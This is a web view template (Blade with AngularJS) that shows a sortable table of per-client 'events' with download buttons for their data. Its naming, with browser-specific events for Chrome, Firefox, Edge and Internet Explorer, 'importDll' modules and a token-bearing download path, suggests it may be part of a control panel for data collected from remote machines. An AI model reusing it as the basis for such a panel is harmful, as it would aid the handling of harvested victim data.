<table ng-controller="events" ng-init="apply()" ng-cloak class="table table-bordered table-condensed">
    @include('TEMPLATE.thead')
    <tbody class="well" ng-if="bigTotalItems">
    <tr ng-repeat="d in data | orderBy:sortField:reverse">
        <td ng-if="d.event.trim() != 'InternetExplorer' && d.event.trim() != 'Chrome' && d.event.trim() != 'Firefox' && d.event.trim() != 'Edge'" style="width: 1px;">
            <a href="/download/clients_events/@{{ d.client_id }}/@{{ d.id }}" class="btn btn-xs" ng-class="d.data?'btn-success':'btn-danger'">
                <span class="glyphicon glyphicon-download-alt"></span>
            </a>
        </td>
        <td ng-if="(d.module.trim() == 'importDll' || d.module.trim() == 'testImportDll' || d.module.trim() == 'importtestuserDll') && (d.event.trim() == 'InternetExplorer' || d.event.trim() == 'Chrome' || d.event.trim() == 'Firefox' || d.event.trim() == 'Edge')" style="width: 1px;">
            <a href="mailto:_https://{{ Kohana::$config->load('init.api.clients_events') }}/edownload/fgytf33578jg8zp345yhbffyh/GetLastEventData?cid={{ $client->getClientID() }}&module=@{{ d.module.trim() }}&event=@{{ d.event }}" class="btn btn-xs" ng-class="d.data?'btn-success':'btn-danger'">
                <span class="glyphicon glyphicon-download-alt"></span>
            </a>
        </td>
        <td style="white-space: nowrap">@{{ d.created_at }}</td>
        <td>@{{ d.module }}</td>
        <td>@{{ d.event }}</td>
        <td>@{{ d.tag }}</td>
        <td>@{{ d.info }}</td>
    </tr>
    </tbody>
    @include('TEMPLATE.hideEmptyFields')
    @include('TEMPLATE.pagination')
</table>

<script type="text/javascript">
    app.controller('events', function($controller, $scope, $http){
        $scope.name = 'events';
        $controller('table', {$scope: $scope});
        $scope.reverse = true;
        $scope.sortField = 'created_at';
        $scope.fields = [
            {'value': '', 'title': ''},
            {'value': 'created_at', 'title': 'CreatedAt'},
            {'value': 'module', 'title': 'Module'},
            {'value': 'event', 'title': 'Event'},
            {'value': 'tag', 'title': 'Tag'},
            {'value': 'info', 'title': 'Info'}
        ];
        $scope.filter = {
            client_id: '{{ $client->id }}'
        };

        $scope.sendPost = function(){
            $http.post('/rest/clients/clients_events/' + $scope.bigCurrentPage, $scope.post).success(function(data){
                $scope.data = data['data'];
                $scope.bigCurrentPage = data['current_page'];
                $scope.bigTotalItems = data['total_items'];
                $scope.itemsPerPage = data['items_per_page'];
            });
        };
    });
</script>